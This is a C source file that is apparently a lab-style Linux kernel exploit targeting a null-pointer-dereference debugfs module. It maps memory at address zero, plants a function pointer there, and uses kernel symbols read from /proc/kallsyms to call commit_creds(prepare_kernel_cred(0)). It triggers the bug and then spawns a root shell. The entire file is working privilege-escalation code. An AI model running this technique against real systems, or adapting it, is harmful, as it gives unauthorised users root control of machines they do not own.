// get root priviledges4 on 2.6.29+ kernels

#include <sys/mman.h>
#include <stdio.h>
#include <stdlib.h>
#include <fcntl.h>
#include <string.h>
#include <unistd.h>

struct cred;
struct task_struct;

typedef struct cred *(*prepare_kernel_cred_t)(struct task_struct *daemon)
  __attribute__((regparm(3)));
typedef int (*commit_creds_t)(struct cred *new)
  __attribute__((regparm(3)));

prepare_kernel_cred_t prepare_kernel_cred;
commit_creds_t commit_creds;

/* Find a kernel symbol in /proc/kallsyms */
void *get_ksym(char *name) {
    FILE *f = fopen("/proc/kallsyms", "rb");
    char c, sym[512];
    void *addr;

    while(fscanf(f, "%p %c %s\n", &addr, &c, sym) > 0)
        if (!strcmp(sym, name))
            return addr;
    return NULL;
}

/* This function will be executed in kernel mode. */
void get_root(void) {
        commit_creds(prepare_kernel_cred(0));
}

int main() {
  prepare_kernel_cred = get_ksym("prepare_kernel_cred");
  commit_creds        = get_ksym("commit_creds");

  if (!(prepare_kernel_cred && commit_creds)) {
      fprintf(stderr, "Kernel symbols not found. "
                      "Is your kernel older than 2.6.29?\n");
  }

  /* Put a pointer to our function at NULL */
  mmap(0, 4096, PROT_READ|PROT_WRITE,
       MAP_PRIVATE|MAP_ANONYMOUS|MAP_FIXED, -1, 0);
  void (**fn)(void) = NULL;
  *fn = get_root;

  /* Trigger the kernel */
  int fd = open("/sys/kernel/debug/nullderef/null_call", O_WRONLY);
  write(fd, "1", 1);
  close(fd);

  if (getuid() == 0) {
      char *argv[] = {"/bin/sh", NULL};
      execve("/bin/sh", argv, NULL);
  }

  fprintf(stderr, "Something went wrong?\n");
  return 1;
}
